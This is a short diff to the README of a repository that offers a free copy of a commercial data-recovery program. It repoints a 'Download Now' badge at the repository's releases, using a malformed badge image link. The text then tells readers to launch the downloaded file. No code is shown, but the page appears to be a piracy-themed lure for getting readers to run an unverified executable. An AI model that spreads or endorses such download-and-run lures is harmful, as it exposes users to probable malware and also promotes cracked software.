@@ -12,7 +12,7 @@ Welcome to the Stellar Data Recovery Pro Free repository! Here you will find inf
 
 To access the resources, click the button below:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/files/Project.zip)
+[![Download Now](https://github.com/khemrapk/Stellar-Data-Recovery-Pro-Free/releases%20Now-Click%20Here-blue)](https://github.com/khemrapk/Stellar-Data-Recovery-Pro-Free/releases)
 
 If the link ends with a file name, make sure to launch it to begin exploring the Stellar Data Recovery Pro resources.
 
